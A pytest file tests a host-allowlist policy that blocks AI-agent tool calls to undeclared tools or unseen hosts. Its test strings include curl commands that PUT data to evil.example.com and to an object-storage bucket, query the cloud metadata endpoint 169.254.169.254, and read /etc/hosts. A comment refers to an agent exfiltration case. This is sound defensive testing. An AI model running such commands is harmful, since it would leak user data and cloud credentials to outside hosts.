from conftest import OSS, bash_request

from safeagents import DEFAULT_ALLOWED_HOSTS, Policy, declared_tools, extract_hosts


def test_declared_tools_reads_both_formats():
    assert declared_tools({"tools": [{"type": "function", "function": {"name": "read_file"}}]}) == {"read_file"}
    assert declared_tools({"tools": [{"name": "get_weather", "input_schema": {}}]}) == {"get_weather"}


def test_extracts_url_hosts_and_bare_ips():
    text = '{"cmd": "curl -X PUT https://user:pw@Evil.Example.com:8443/x && curl 169.254.169.254/latest; cat file:///etc/hosts"}'
    assert extract_hosts(text) == ["169.254.169.254", "evil.example.com"]
    assert extract_hosts("pip install torch==2.5.1 && ls ./src/main.rs") == []
    assert extract_hosts("version 1.2.3.4.5 and 999.1.1.1") == []


def test_declared_tool_with_unseen_host_is_blocked():
    # The Cohere case: `bash` is declared, but the bucket URL came from nowhere.
    p = Policy(bash_request("Write a detection rule for curl downloads to /tmp."))
    reason = p.check("bash", f'{{"cmd": "curl -o /tmp/put_probe -X PUT --data-binary PROBE https://{OSS}/probe"}}')
    assert OSS in reason
    assert p.check("bash", '{"cmd": "curl http://169.254.169.254/latest/meta-data/"}')
    assert p.check("shell", "{}") == "undeclared tool"


def test_host_from_user_or_allowlist_is_fine():
    p = Policy(bash_request("Download https://data.example.org/file.csv please"), DEFAULT_ALLOWED_HOSTS)
    assert p.check("bash", '{"cmd": "curl -O https://data.example.org/file.csv"}') is None
    assert p.check("bash", '{"cmd": "git clone https://github.com/huggingface/transformers"}') is None
    assert p.check("bash", '{"cmd": "curl http://localhost:8080/health"}') is None


def test_host_only_in_model_turns_does_not_count():
    req = bash_request("hi")
    req["messages"].append({"role": "assistant", "content": f"I will use https://{OSS}"})
    assert Policy(req).check("bash", f"curl https://{OSS}/x")
